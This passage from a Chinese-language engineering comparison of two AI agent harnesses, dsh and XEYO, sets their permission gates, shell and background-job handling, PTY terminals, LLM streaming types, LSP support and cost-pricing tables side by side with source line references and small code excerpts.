**读路径的实现级细节**（`policy.py:1502-1543`）：`in _READ_PATH_TOOLS` 分支先 `_pick_path(tool_input, "file_path", "path", "filePath", "notebook_path")`（4 个键名依次尝试），无 path 时**回退到 `os.path.abspath(cwd)`**（即「不填路径 = 读工作区根」）；然后 `check_read_permission_for_path(path, context=ctx)`；DENY 再细分三类原因（`path_outside_working_directory` / `secret_path` / `dangerous_path`），与旧 gate 契约保持一致（注释语）。

**保护元数据的实现位置很讲究**（`:1605-1607` 注释）：

> T12：受保护元数据（.git/.xeyo/.agents）——workspace 内默认只读。**放在 memdir 分支之前会导致 Memory 工具误伤，故置于 memdir allow 之后。**

——即分支顺序是被一次误伤事故调整过的。

###### 11.3 对照

| 维度 | dsh | XEYO |
|---|---|---|
| 单一入口 | **是**：一切经 `ctx.fs` seam，工具无法绕过 | **否**：三条通道，两条有覆盖缺口 |
| 包含判定 | 词法快速路径 + `dev/ino` 身份回退（防 Windows 8.3/大小写） | `path_in_allowed_working_path`（词法为主） |
| 读前写前规则 | 独立 gate 包，**不改 schema** | 无「读前必须先读」的等价门（有 `needs_read_state` 标记 + `missing_read:` 报错） |
| 默认只读 | 沙箱模式 `read-only` 是默认档 | 写默认 ask；受保护元数据默认只读 |
| 写入意图事件 | `fs/write-intent` / `fs/edit-intent` / `fs/observed` | 无（有 `operation_id` 关联 rewind） |
| 检索工具 | `glob`/`grep` spawn 打包 ripgrep，**从不后台** | `glob_tool`/`grep_tool`（Python 实现）+ `bash_tool` 路由 `rg` |
| 路径键名 | JSON Schema 显式定义 | `_pick_path` 容错 4 个键名（file_path/path/filePath/notebook_path） |

---


## 域 14 · Shell / 终端 / 子进程

> 来源：**R2 设计面·设计级对比** · 原节「12. Shell / 终端 / 子进程」（源 L717–747）

##### 12. Shell / 终端 / 子进程

###### 12.1 dsh

- **`ShellExecutor` 抽象**（`packages/shell/shell/src/index.ts:64-100`）：`run`（前台：非零退出/超时杀/abort 都 **resolve 为结果**，不抛）、`start`（后台，**无 timeout**）、`readOutput`（增量、不重复）。作者显式写死后台无超时（`:54-55`）。
- **Provider 矩阵**：`bash-local` / `pwsh-local` + 沙箱版 `bash-sandbox` / `pwsh-sandbox`；命令路由在 provider 内部。
- **持久 PTY**：`ctx.terminals` 是 owner-scoped 注册表，dispose 时 `disposeAll` 并等待清理（`'pty teardown'`，`terminal/src/index.ts:105-118`）；6 个 `tool-terminal` 工具（spawn/close/read/send/signal/list）+ `run_in_background`（`tool-terminal/src/index.ts:27, 43-46`）；`terminal-bash` 在沙箱模式变更时**拒绝开新 PTY**（`terminal-bash/src/index.ts:37-60`）。
- **子进程**：`win32-process` 用 `CreateProcessAsUserW` + Job Object 原语（`subprocess/win32-process/src/index.ts:1`）；`subprocess-local` 在组合拆卸时停并 await 后台进程。

###### 12.2 XEYO

- `BashTool.call` 二路：容器（docker SDK）/ 宿主。超时：前台默认 `120_000`、上限 `600_000`，worker 模式 `30_000`/`60_000`（`bash_tool.py:124-125, 177-178, 346-366`）。
- 截断 `MAX_RESULT_CHARS = 30_000`（`bash_tool.py:126`）；**promote 机制**：`45_000ms` 内未完 → 自动晋后台 job（**进程不重启**）（`:130, 633-662`）。
- `run_in_background` → registry job（`job_output/list/kill` + 完成通知）（`:588-622`）。
- Windows 进程树：`win_job.py` 内存上限 + 超时整树杀；`runner.py` 优先 `taskkill /T`（`bash_tool/runner.py:65, 314, 418`）。
- **持久终端 / PTY：未见**（grep 无终端会话实现）。**后台 job 24h 超时：源码未见**（grep `86400|24h|MAX_IDLE` 无命中；后台 job 由 session abort 关 Job Object 回收，`server/job_registry.py:348`）。

###### 12.3 设计分歧

| 维度 | dsh | XEYO |
|---|---|---|
| Shell 抽象 | seam（`run`/`start`/`readOutput`） | 单工具内 if/else |
| 后台超时 | **无**（设计如此） | 前台 120s/600s，无后台死线 |
| 长命令处理 | 由模型显式 `run_in_background` | **自动 promote**（45s 未完转后台，进程不重启） |
| 持久终端 | PTY + 6 工具 + 沙箱联动 | 无 |
| 沙箱联动 | spawn 前 `confine` | 无（有 destructive_guard 启发式） |

XEYO 的**自动 promote** 是 dsh 没有的贴心设计：模型不必预判命令会不会久，引擎在执行层自动换轨，且进程状态不丢。

---


> 来源：**R3 实现面·实现级对比** · 原节「12. Shell / 终端 / 子进程：实现级」（源 L1339–1382）

##### 12. Shell / 终端 / 子进程：实现级

###### 12.1 dsh

- **`packages/shell`**（61 文件 / 14,758 行）：能力缝 + 本地 provider + pwsh provider。工具面两个名（`bash` / `pwsh`）**各有两个实现包**：一次性（`tool-bash` / `tool-pwsh`）与持久 PTY（`tool-bash-persistent` / `tool-pwsh-persistent`）——**同名不同实现，由组合决定**。
- **一次性 pwsh 的实现在 tool-catalog 里写得很具体**：「Each call runs in a fresh process (no persistent PTY session), with native `C:\...` paths and `$env:NAME` variables.」**且「mirrors the bash tool call-for-call minus sandbox controls」**。
- **`packages/terminal`**（17 文件 / 6,582 行）+ `tool-terminal` 六件套：`terminal_open/close/list/read/send/signal`。`terminal_send(run_in_background: true)` 注册到 `ctx.jobs`；tool-catalog 明确 **「TUI, named key sequences, BEL, resize, auto-start, and cross-agent sharing are absent from the schema」**——即持久终端的能力边界是显式收敛的。
- **`packages/subprocess`**（27 文件 / 7,440 行）：含 Win32 细节与进程树 kill（`subprocess-win32` 之类的库在包内）。
- **后台作业统一收口**：`tool-jobs` 的 `job_kill/job_list/job_output` 是**kind-agnostic** 的——「background bash commands, PTY sends, and subagents are read, listed, and killed through the same three tools」。加载该插件会「arms producers' `ctx.jobs.start()`」。
- **超时**：`guard/timeout-policy`（`packages/guard/timeout-policy/src/index.ts`）——读 `ctx.tools.get(exec.name, exec.agent)?.timeoutMs`，超时产 `ToolExecutionResult`，消息 `tool call timed out after ${timeoutMs}ms`，错误码常量 `TOOL_TIMEOUT`。

###### 12.2 XEYO

- **`python/tools/bash_tool/`**：命令路由 + 超时 + 截断 + 后台。与 dsh 的一处**明确的产品级优势**（第二轮已认定，本轮补实现证据）：**45s 未完自动 promote 到后台且进程不重启**——dsh 要模型自己预判 `run_in_background`。
- **危险命令拦截**：`permissions/policy.py` 的 `_evaluate_bash`（`:822-1015`，约 193 行）是一整套 bash 语义分析，实测的正则常量：

| 常量 | 行 | 作用 |
|---|---|---|
| `_BASH_REDIRECT_RX` | `:742` | 写重定向识别 |
| `_BASH_WRITE_CMD_RX` | `:745` | 写命令识别 |
| `_BASH_INTERP_RX` | `:751` | 解释器内联执行识别 |
| `_BASH_WRITE_MARK_RX` | `:754` | 写标记 |
| `_BASH_PY_OPEN_RX` | `:760` | Python `open()` 写文件识别 |

配套函数 `_bash_write_target(command)`（`:765`）→ `bash_write_target(command)`（`:798`）、`_bash_writes_file`（`:785`）→ `bash_writes_file`（`:803`）、`_peer_bash_conflict`（`:1016`）、`_bash_touches_policy_file`（`:1092`）、`_bash_write_path_block`（`:1109`）——**从 bash 命令行反推它想写哪个文件，再走写路径策略**。这是「观测域一致性」的一个实现级范例：bash 与 Write 走同一套写策略。
- **G29 组合命令豁免**（`:1348-1362`）：`bash_command_is_composite(cmd)` 为真 → 不吃前缀 token grant。
- **持久终端**：**无**（实测穷举未见 PTY/terminal 会话抽象）。
- **超时/后台**：后台 job 的 24h 超时 = 事实无超时（第二轮已认定），实现位于 `tools/job_tools.py`。

###### 12.3 对照

| 维度 | dsh | XEYO |
|---|---|---|
| shell 一次性与持久 | **两种都有**，同名工具由组合切换 | 只有一次性 |
| PTY | 有（6 个终端工具，能力边界显式收敛） | 无 |
| pwsh | 有专门 provider + 专属工具名 + 专属持久版 | Bash 工具内处理（无独立 pwsh 工具面） |
| 后台作业 | `job_kill/list/output` kind-agnostic 收口 | `job_output/list/kill` 三件套（同名同构） |
| 后台启动方式 | 模型显式 `run_in_background` | **Bash 45s 自动 promote**（无需预判） |
| 超时 | per-tool `timeoutMs` + guard 包统一执行 | 工具内自管 + 后台 job 24h（事实无超时） |
| 危险命令分析 | 未见（靠沙箱兜底） | **~193 行 bash 语义分析 + 5 条正则 + 写目标反推** |
| 进程树 kill | 有（subprocess 包） | 有（Windows Job Object / taskkill） |

---


## 域 15 · 模型层与 provider / 流式协议

> 来源：**R1 功能面·全量对比** · 原节「18. 模型层与 provider」（源 L384–397）

##### 18. 模型层与 provider

| | XEYO | dsh |
|---|---|---|
| 适配 | `python/model/` 10 文件：deepseek / openai / anthropic / fake（`docs/Anthropic原生适配器-实施记录.md`） | `ctx.llm` + `abstract class LlmAdapter`（唯一必需方法 `stream(options): AsyncIterable<StreamChunk>`，`llm/src/index.ts:197,278`）；`registerAdapter(providers, adapter)` 按 provider 路由，重复抛 `DUPLICATE_ADAPTER`（`:384`） |
| Provider | 3 家（+fake） | `llm-deepseek`（官方）、**`llm-pi-ai`**（库驱动，多厂商）、`llm-replay`（测试） |
| 思考态 | `docs/最终方案-思考态回放.md` + `docs/deepseek-harness-思考态实现考据.md`（**已专门考据过 dsh 的 `ReasoningBlock` 做法**） | `ReasoningBlock {type:'reasoning', text}` 明文字块（`llm/src/types.ts:59-63`）；`reasoning_effort` ∈ `off/low/high/max`（默认 high，`llm-deepseek/src/adapter.ts:165-186`）；`reasoning_content` delta → reasoning block（`translate.ts:155-164`） |
| 重试 | `LlmRetry`/`RetryStarted` 事件 | `llm-retry`：`normal`（maxRetries=5）/`always`；可重试码 `EMPTY_RESPONSE|RATE_LIMIT|SERVER|TIMEOUT|TRANSPORT`（`retry-policy.ts:18-24`） |
| 流 | SSE（OpenAI 兼容帧 + `xy.*` 扩展帧） | SSE 解析 `llm-deepseek/src/sse.ts` + `translate.ts`；`llm/stream` waterfall 可拦截 |
| KV 缓存 | **主动保前缀**（Date/Model 不进左段）+ 命中/未命中计费 | 只读回 `prompt_cache_hit_tokens`/`miss`（`translate.ts:56`、`types.ts:174-175`）；**请求侧无 `cache_control`/`prompt_cache` 参数** |
| wire 扩展 | — | `docs/deepseek-llm-api-wire-extensions.md`：顶层 `dsh_plugin_packages`（默认开）、`dsh_session_log`（默认关）+ 归因头 `x-deepseek-harness-user-id`/`session-id`/`compact` |

---


> 来源：**R2 设计面·设计级对比** · 原节「13. 模型层与 provider」（源 L748–781）

##### 13. 模型层与 provider

###### 13.1 dsh：LlmAdapter seam + 类型化流 + 可拦截

- **三角色**：Service Definition = `LlmRuntime extends TypertRemoteService`（`llm/src/index.ts:330`）；Provider = `LlmAdapter`（唯一必需方法 `stream()`，`:197-279`）；Consumer = agent loop 经 `llm/stream` waterfall（`:71, 1093-1107`）。`registerAdapter` 按 provider 路由，重名抛 `DUPLICATE_ADAPTER`（`:384-413`）。
- **Provider 全集**：`llm-deepseek`（官方直连）、**`llm-pi-ai`**（库驱动多厂商）、`llm-replay`（测试）。
- **请求组装**：`GenerateOptions`（`types.ts:407-443`，含 `provider/model/reasoningEffort/purpose`）；`adapterStream` 把文件投影成文本、图像按模态处理（`:998-1080`）。
- **流式协议**：`StreamChunk` 类型化联合（`types.ts:378-390`）：`block-start / text-delta / reasoning-delta / tool-call-delta / block-end / usage / finish`。
- **思考态**：`ReasoningBlock {type:'reasoning', text}`（`types.ts:59-63`）；`reasoning_effort ∈ off/low/high/max`（`adapter.ts:161-186`，默认 high）；`reasoning_content` delta → reasoning block（`translate.ts:155-164`）。
- **重试**：`ResolvedRetryPolicy` 分 `normal`（maxRetries=5）/`always`；可重试码 `EMPTY_RESPONSE | RATE_LIMIT | SERVER | TIMEOUT | TRANSPORT`（`llm-retry/retry-policy.ts:14-24`）。
- **错误分类**：`LlmError` + 机器码（`index.ts:90-124`）；HTTP 映射 401/403→AUTH、429→RATE_LIMIT、≥500→SERVER（`adapter.ts:332-344`）。
- **token**：`TokenUsage` 互斥计数含 `cacheReadTokens` / `reasoningTokens`（`types.ts:149-163`）；`mapUsage` 从 `prompt_tokens` 里减掉 cacheRead（`translate.ts:55-72`）。
- **KV wire**：请求侧**无** `cache_control` 全局参数；扩展字段 `dsh_plugin_packages`（默认开）、`dsh_session_log`（默认关）+ 归因头（`x-deepseek-harness-user-id` 等）**全在 messages 之外**（`docs/deepseek-llm-api-wire-extensions.md`；`adapter.ts:531-543`）。

###### 13.2 XEYO：三家 provider 各自实现，reasoning 跨厂商有损

- **provider**：`openai_compat`（deepseek 路径，复用 `_openai_common.py`）、`anthropic.py` 原生适配器、`deepseek.py`、`fake`。**无统一基类**，各有 `stream()`。
- **思考态**：`anthropic.py:_blocks_to_anthropic` 处理 `thinking` + `signature` 回放（`:200-214`）；`thinking_delta` → `reasoning_delta` 实时渲染（`:385-399`）；`output_config.effort`（`:576-577`）。
- **跨厂商裁剪**：OpenAI 系纯文本 reasoning 转 Anthropic 时**静默丢弃**（无签名不伪造，`:207-210`）——这是一条明确的"宁可丢也不造假"纪律。
- 流式用 `ModelChunk(kind=...)`（`model/chunks.py:12`），弱类型。

###### 13.3 设计分歧

| 维度 | dsh | XEYO |
|---|---|---|
| 适配抽象 | `LlmAdapter` seam + 路由 + 重复检测 | 无基类，各 provider 独立 |
| 可拦截 | `llm/stream` waterfall（可改写请求/拦截流） | 无 |
| 多厂商 | `llm-pi-ai` 库驱动（含 Anthropic `cache_control` 支持声明） | 三家手写适配器 |
| 流类型 | 强类型联合（7 种 chunk） | `ModelChunk(kind=...)` |
| reasoning | 明文 block + effort 四档 | anthropic 带签名回放；deepseek `reasoning_content`；跨厂商有损裁剪 |
| 请求侧缓存 | 扩展字段与归因头（全在 messages 外） | 无 |

---


> 来源：**R3 实现面·实现级对比** · 原节「13. 模型层与流式协议：实现级」（源 L1383–1437）

##### 13. 模型层与流式协议：实现级

###### 13.1 dsh：7 种 chunk 的封闭联合

**文件**：`packages/llm/llm/src/types.ts`（`llm` 包 115 文件 / 32,560 行，另有 `llm-deepseek` / `llm-pi-ai` / `llm-retry` / `token-meter` / `deepseek-llm-api-extensions` 五个子包）

```ts
// types.ts:378-390
export type StreamChunk =
  | { type: 'block-start';     index: number; blockType: ContentBlockType }
  | { type: 'text-delta';      index: number; text: string }
  | { type: 'reasoning-delta'; index: number; text: string }
  | { type: 'tool-call-delta'; index: number; id: ToolCallId; name?: string; argumentsDelta: string }
  | { type: 'block-end';       index: number; block: ContentBlock }
  | { type: 'usage';           usage: TokenUsage }
  | { type: 'finish';          reason: FinishReason; replayState?: ReplayEnvelope }
```

**实现级要点有三个**：
1. **`reasoning-delta` 与 `text-delta` 平级**——thinking 不是特殊路径，是同级的块增量；
2. **`tool-call-delta` 带 `index` + `id` + 可选 `name` + `argumentsDelta: string`**——即**工具参数是增量字符串拼接**，最终解析在 agent 侧（`tool-calls.ts:parseArguments`）；`name` 可选是因为它可能只在第一片出现；
3. **`finish` 携带 `replayState?: ReplayEnvelope`**——**重放元数据随流结束回传**，`AssistantStreamAttempt.replayState`（`assistant-stream.ts:136-139`）转发它，最终写进 `assistant/message.source.replayState`（`agent.ts:455`）。这是「录制/回放」能力的实现接口：**回放不靠重新请求，靠当时记录的 envelope**。

**`ToolSchema` 的归属**（`llm/src/types.ts:392-403`）：声明在 `dsh-llm` 而不是 `dsh-tools`，注释给出理由「it is part of `GenerateOptions`」。

**重试**：独立包 `llm-retry`，有 `llm/retry` + `llm/retry-started` 两个事件（实测）；agent 侧的消费点是 `agent/request-error` waterfall 返回 `{kind:'retry'}` → `continue`（`agent.ts:432-447`）——**重试决策是插件给的，不是硬编码的退避**。

**token 计量**：独立包 `token-meter`。

**KV 缓存 wire 扩展**：`deepseek-llm-api-extensions` 包 + `llm-pi-ai/catalog.ts` 的 `cacheControlFormat: 'offer'`。

###### 13.2 XEYO：provider 适配 + reasoning 裁剪 + 事件化重试

- **provider 抽象**：三家各自实现（OpenAI 兼容 / Anthropic / DeepSeek），thinking 处理链路跨厂商**有损**（第二轮已认定）。
- **流式解析**：SSE chunk → `AssistantDelta` / `ReasoningDelta` 两类事件（`events.py:27-35`）——**XEYO 把 text 与 reasoning 拆成两个平级 dataclass**，与 dsh 的 `StreamChunk` 联合里的 `text-delta`/`reasoning-delta` 是同一个观察，两种表达。
- **重试的事件化**（`events.py:287-310`）：`LlmRetryEvent` 带 `attempt, next_retry_ms, code, message, provider, model`，**UI 依据 `next_retry_ms` 渲染倒计时**（docstring 原文）；`LlmRetryStartedEvent` 带 `attempt`。两者都**明确非 surface、不进 transcript**。`code` 来自 `classify_llm_failure`（docstring 原文）——即**错误分类是显式函数**。
- **`UsageEvent` 的上下文构成**（`events.py:128-130`）：`context_breakdown: list[{category,label,tokens}]`，注释「供前端画分段用量条」，且 **`sum(tokens) ≈ context_tokens`**——这是 `_compute_category_chars`（`query_loop.py:427`）+ `_scale_breakdown`（`:468`）两函数协作的产物：**按字符分类统计 → 按真实 token 总量等比缩放**（`_scale_breakdown` 的存在说明 XEYO 明确接受「字符比例近似 token 比例」这一近似）。
- **`reasoning` 裁剪**：第二轮已核实为跨厂商有损；本轮未见独立的 reasoning 存储事件（`ReasoningDelta` 不进 transcript）。

###### 13.3 对照

| 维度 | dsh | XEYO |
|---|---|---|
| 流式类型 | 7 种 chunk 的封闭联合（含 block-start/end、usage、finish） | 2 种 delta 事件 + usage/final 独立事件 |
| 块增量 | 有 `index`/`block-start`/`block-end` 显式块边界 | 无块边界事件（按 delta 流） |
| 工具参数 | `tool-call-delta.argumentsDelta` 增量串，agent 侧解析 | 同上（provider 侧累积后给 `ToolCallEvent.input`） |
| 重放元数据 | **有**（`ReplayEnvelope` 随 finish 回传并持久化） | 无 |
| 重试决策 | 插件 waterfall（`agent/request-error` → `retry`） | 内置退避 + `llm_retry` 事件外发 |
| 错误分类 | `LlmError`（保留 facts）+ `errorChain` 兜底 `UNKNOWN` | `classify_llm_failure` 稳定错误码 |
| token 计量 | 独立包 `token-meter` | `usage/` 模块（ledger/attribution/vendor/pricing） |
| 上下文构成 | 无分类明细 | `context_breakdown` 分段用量（字符→token 等比缩放） |
| KV 缓存声明 | provider 库 `cacheControlFormat` | 靠「左段锁死 + 尾部追加」+ T_now 声道 |

---


> 来源：**R4 枚举面·逐字段级对比** · 原节「§10 LLM 层：逐字段与流式协议」（源 L954–1015）

##### §10 LLM 层：逐字段与流式协议

###### 10.1 dsh

**能力缝三角色**（`packages/llm/llm/src/types.ts`）

- 发现/配置：`LlmProviderInfo{id, name}`、`LlmConfigurableProvider{provider, displayName, settingsNs, settingsPath, declared?}`
- 模型元数据：`LlmModelInfo{provider, id, name, description?, inputModalities?}` → `LlmResolvedModelInfo`（+`context?: {contextWindow}`, `defaultMaxTokens?`, `reasoning?: {efforts[{id,name,description?}], defaultEffort?}`）
- 推理档：`LlmReasoningEffortInfo{id, name, description?}` / `ReasoningEffortId`（branded）

**KV 缓存**：在 provider 库声明（前轮已核：`llm-pi-ai/catalog.ts:233` `cacheControlFormat:'offer'`），**不在引擎**。`TokenUsage` 有 `cacheReadTokens`/`cacheWriteTokens` 两个独立字段。

**流式**：7 变体 `StreamChunk`（见 §2.1），显式块生命周期 + `replayState` 可重放封套。

**重试**：`llm/retry` 与 `llm/retry-started` 两个**独立事件**（调度决策 vs 实际开始），可在 UI 上渲染倒计时。

###### 10.2 XEYO

**provider 抽象**：`ModelClient` 协议（`query_loop.py` 形参 `model: ModelClient`）。
**事件层**：`AssistantDelta{text}` / `ReasoningDelta{text}` 两个**极简** delta 类，无 block 生命周期。
**重试**：`LlmRetryEvent{attempt, next_retry_ms, code, message, provider, model}` + `LlmRetryStartedEvent{attempt, provider, model}` — 与 dsh **同名同语义**（两侧都是"调度"与"开始"两个事件），注释明写 **非 surface 事件、不进 transcript**。
**重试策略函数**：`_llm_max_attempts:263`、`_llm_retry_delay_ms:273`、`_llm_provider_name:284`、`_llm_model_name:288`、`_audit_llm_failure:292`。
**thinking 裁剪**：`ReasoningDelta` + `turn_reasoning_parts`（`query_loop.py:792`）累计。
**usage/token**：`UsageEvent` 19 字段（全文件最重），含 `context_tokens` / `context_limit` / `context_breakdown[{category,label,tokens}]` / `compact_cursor` / `c2_summary_chars` / `cost_source`。
**成本表（`usage/pricing.py`）**

```python
# (cache_hit, cache_miss, output) 元 / 百万 token
_DEEPSEEK = {
    "flash": ((0.05, 1.5, 4.5), (0.10, 3.0, 9.0)),   # (空闲档, 高峰档)
    "pro":   ((0.15, 4.5, 13.5), (0.30, 9.0, 27.0)),
}
_OPENAI_USD = {
    "gpt-4o-mini": (0.15, 0.075, 0.60), "gpt-4o": (2.50, 1.25, 10.00),
    "gpt-4.1-mini": (0.40, 0.10, 1.60), "gpt-4.1": (2.00, 0.50, 8.00),
}
USD_CNY = 7.2
```

- 文档头声明口径："DeepSeek V4 官方价（**2026-08-17 起**）… 高峰 09:00–12:00、14:00–18:00（北京时间）；空闲 = 高峰 × 1/2"。
- **峰谷表可整体覆盖**：`XEYO_TIME_TIERS_JSON`；默认 `{"deepseek": {"windows": {"peak": (("09:00","12:00"),("14:00","18:00"))}, "multipliers": {"peak": 2.0, "offpeak": 1.0}}}`。
- `time_tier()` 支持**跨零点窗口**（`minutes >= s or minutes < e`）；`disabled_models` 可让指定模型不分时。
- `effective_prices()` = 静态基价 × 时段倍率；实时价与本地表都对齐"低峰"，故 peak 倍率 **2.0**。
- 命中率口径原文：`cacheHitPercent = cacheRead/(uncached+cacheRead+cacheWrite)`；无独立 write 档的厂商由 `miss = prompt − hit` 合并计算，`hit/(hit+miss)` 等价。
- ⚠️ **注意**：工作记忆里记的"新价 0.02/1.0/4.0 尚未更新"——本轮实测文件头仍是 **2026-08-17 价表**，且 `_DEEPSEEK` 仍带 peak 倍率。**结论维持**：价格表未同步新价。

###### 10.3 字段级差异

| 维度 | dsh | XEYO |
|---|---|---|
| 内容块类型 | 6（text/reasoning/image/file/tool-call/tool-result） | 无类型化块（dict + `type` 字符串） |
| 流式 | 7 变体，显式 block 生命周期 + replay 封套 | 2 个 delta 类（text/reasoning），隐式累积 |
| 结束原因 | 5 变体（`FinishReason`） | `StoppedEvent` 6 值 + `ResultEvent` 7 值 |
| 错误类型 | `LlmFailure{message, code, status?, providerRetryAfterMs?, requestId?}` | `code` 字符串（`classify_llm_failure`） |
| 用量字段 | 6（input/output/total?/cacheRead?/cacheWrite?/reasoning?） | 19（含 context 分段、压缩态、成本源） |
| 成本 | ❌ 无成本统计（全仓无 cost 引擎） | ✅ pricing + ledger + attribution + 峰谷 |
| KV 缓存声明 | provider 库（`cacheControlFormat`） | 靠"前缀逐字节不变"的注入纪律（env_channel 尾插） |
| 重试事件 | 2 个（retry / retry-started） | 2 个（同名同语义） |
| 模型发现 | ✅ `LlmModelDiscovery*` + 拒绝错误码 | ✅ `/v1/models` |

---


## 域 16 · 代码运行时与 LSP

> 来源：**R2 设计面·设计级对比** · 原节「14. 代码运行时与 LSP」（源 L782–804）

##### 14. 代码运行时与 LSP

###### 14.1 dsh

- **`ctx.codeRuntime`**（`code-runtime/code-runtime/src/index.ts:95-120`）：`run` 跑模型写的程序，对接 host async bindings；`isolation ∈ worker-thread | process | container`；作者要求「treat programs as hostile peers, isolate runs from one another, and terminate and await in-flight runs during disposal」（`:99-101`）。消费端 = `run_code` 工具（PTC 模式）。
- **`ctx.lsp`**（`lsp/lsp/src/index.ts:82`）：注册 provider（按扩展名**独家保留**），只暴露四个操作 `goToDefinition / findReferences / goToImplementation / hover`，**无 JSON-RPC 逃逸口**（README:10-11）——把语言服务器的能力面**收窄到可审计的四件事**，而不是把 LSP 全量暴露给模型。

###### 14.2 XEYO

- `DiagnosticsTool` 源码注释自陈 *"minimal language diagnostics (not a full LSP/IDE)"*（`tools/diagnostics_tool/diagnostics_tool.py:1`）；基于 AST 的静态诊断，`_TIMEOUT_S=30`、`_MAX_CHARS=16000`、`_MAX_FILES=50`，仅 Python/TS/JS（`:19-24`）。

###### 14.3 设计分歧

| 维度 | dsh | XEYO |
|---|---|---|
| 代码执行 | `run_code` + 隔离三档 + PTC 模式 | 无（靠 Bash 跑脚本） |
| LSP | 真语言服务器（goto/refs/hover）+ seam | AST lint |
| 能力面收窄 | 显式四操作白名单 | 不适用 |

**PTC（Programmatic Tool Calling）值得单独说**：dsh 的 `run_code` 让模型写一段程序来编排多次工具调用，一次往返替代多轮。作者对其规则的说明（`core/tools/src/index.ts:49-51`）：「`run_code` is the only tool you can call directly — a tool call naming any other tool fails. Reach every tool the SDK declares below from inside the program.」这是"把工具调用循环下沉到代码里"的一种正交优化，XEYO 完全没有。

---


## 域 17 · 成本与用量

> 来源：**R1 功能面·全量对比** · 原节「19. 成本与用量」（源 L398–407）

##### 19. 成本与用量

| | XEYO | dsh |
|---|---|---|
| 价格表 | `usage/pricing.py`：DeepSeek flash/pro，**高峰(0.10/3.0/9.0)空闲减半**，`USD_CNY=7.2`（`:22-37`）；分时段 `time_tier`（北京 09-12/14-18 倍率 2.0，`:51-112`） | `route-pricing.ts` + 图像定价（`adapter.ts:369`） |
| 计量 | `split_usage` 拆 hit/miss/out（`query_loop.py:1271`）；以厂商权威 `prompt_tokens` 为准，投影估算兜底（`:1276-1284`）；`usage/ledger.py` / `attribution.py` / `combine.py` / `vendor.py` / `multi_agent_metrics.py` | `ctx.tokenMeter`（启发式估算，仅重放测量）；usage 随 `assistant/message` 事件一起落库（无独立 usage 记录） |
| 预算/死线 | **有**：`budget.py` + `runtime_budget`/`budget_mirror`/`wrap_up` T_now 块 + `forced_wrap_up` 收尾窗 | **未见** token 预算/死线机制 |

---


> 来源：**R2 设计面·设计级对比** · 原节「15. 成本与用量」（源 L805–834）

##### 15. 成本与用量

###### 15.1 XEYO：完整成本口径治理

- **价格表** `usage/pricing.py`：DeepSeek flash/pro 峰谷价（高峰 09–12 / 14–18 北京时 ×2.0，`:22-37, 40-112` `time_tier`；`USD_CNY=7.2`）；`LOCAL_PRICING_DB` 兜底 + `aipricing.guru` 实时价（TTL 24h + 磁盘缓存 + 后台线程刷新，`:337-556`）；`split_usage` 拆 hit/miss/out（`:142-162`）。
- **账本**：`ledger.py` / `attribution.py` / `vendor.py` / `combine.py` / `multi_agent_metrics.py`——厂商权威 usage 计账 + 归因 + 多代理成本度量。
- **计量纪律**：以厂商权威 `prompt_tokens` 为准，投影估算仅兜底（`query_loop.py:1276-1284`）。
- **预算死线**：`budget.py` + `runtime_budget` / `budget_mirror` / `wrap_up` 三个 T_now 块（见 §6.5）。
- 已知口径偏差（第一轮所述，仍在）：`pricing.py::_DEEPSEEK["flash"]` 尚未更新到新价，且仍带 peak×2。

###### 15.2 dsh：只有 token 估算，没有钱

- `ctx.tokenMeter`：**启发式估算，且仅用于重放测量**（`token-meter/src/estimate.ts:43` 用 `CHARS_PER_TOKEN`）。
- `TokenUsage` 类型（含 cacheRead / reasoning，`llm/src/types.ts:149-163`）随 `assistant/message` 事件落库，**无独立账本**。
- `adapter.imageRequestPricing` 只做图像视觉 token 计价（`llm/src/types.ts:166-193`）。
- 全仓 grep `cost|budget|price|usd` 在 `packages/llm` 内命中全是测试与描述文本，**无预算/死线实现**。

###### 15.3 设计分歧

| 维度 | dsh | XEYO |
|---|---|---|
| 计价 | 无（仅图像 route-pricing） | 峰谷价 + 实时价源 + 兜底表 |
| 计量用途 | 重放测量 | 决策（预算/收尾窗） |
| 账本 | 无 | ledger / attribution / vendor / combine |
| 死线 | 无 | turn/tool/token/usd + 收尾窗 |

**这是 XEYO 第二强的面**（仅次于注意力治理）。它的实际意义是：一个本地 Agent 要能被"运营"，必须能回答"这次会话花了多少钱、花在哪、还剩多少"。dsh 作为开源 harness 把这件事留给使用者。

---


> 来源：**R3 实现面·实现级对比** · 原节「14. 成本与用量：实现级」（源 L1438–1525）

##### 14. 成本与用量：实现级

###### 14.1 XEYO：价格表 + 峰谷 + 账本文件

**价格表实现（`python/usage/pricing.py`，652 行）**——实测字面值：

```python
# (cache_hit, cache_miss, output) 元 / 百万 token；外层 tuple = (空闲档, 高峰档)
_DEEPSEEK: dict[str, tuple[tuple[float, float, float], tuple[float, float, float]]] = {
    "flash": ((0.05, 1.5, 4.5), (0.10, 3.0, 9.0)),
    "pro":   ((0.15, 4.5, 13.5), (0.30, 9.0, 27.0)),
}
# OpenAI：(input, cached_input, output) USD / 百万
_OPENAI_USD: dict[str, tuple[float, float, float]] = {
    "gpt-4o-mini": (0.15, 0.075, 0.60), "gpt-4o": (2.50, 1.25, 10.00),
    "gpt-4.1-mini": (0.40, 0.10, 1.60), "gpt-4.1": (2.00, 0.50, 8.00),
}
```

**峰谷时段是数据驱动的**（`:52-58`）：

```python
_DEFAULT_TIME_TIERS = {
    "deepseek": {
        "windows": {"peak": (("09:00", "12:00"), ("14:00", "18:00"))},
        "multipliers": {"peak": 2.0, "offpeak": 1.0},
    },
    # 时段 / 倍率可用 XEYO_TIME_TIERS_JSON 整体覆盖，厂商改窗口或折扣不用发版
}
```

即：**DeepSeek 官方高峰 09:00–12:00、14:00–18:00（北京时区），低峰 = 高峰 × 1/2**；本地表与上游实时价都对齐「低峰」档，故 `peak` 倍率 2.0（`:48-50` 注释）。

**一次 P1-2 修复的实现级痕迹**（`:207-215`）：

> 2026-09-09 修复（P1-2）：旧实现把高峰硬编码为「空闲 × 2」（`_DEEPSEEK` 字面 peak 档），忽略配置里的自定义窗口 / 倍率；此处统一为 `基价(空闲档) × 当前档倍率`，与 `effective_prices`（USD 预算链）的时段语义一致。**未覆盖档一律 ×1.0**。

**token 拆分算法 `split_usage` 的容错顺序**（`:150-162`）：

```python
hit  = _as_int(usage.get("prompt_cache_hit_tokens"))
miss = _as_int(usage.get("prompt_cache_miss_tokens"))
out  = ...                                      # completion / output
if isinstance(details, dict) and hit == 0:
    hit = _as_int(details.get("cached_tokens"))  # ① 回退到 details.cached_tokens
if hit + miss == 0 and prompt > 0:
    miss = max(0, prompt - hit)                  # ② 全 miss
    if miss == 0: miss = prompt
elif hit + miss < prompt:
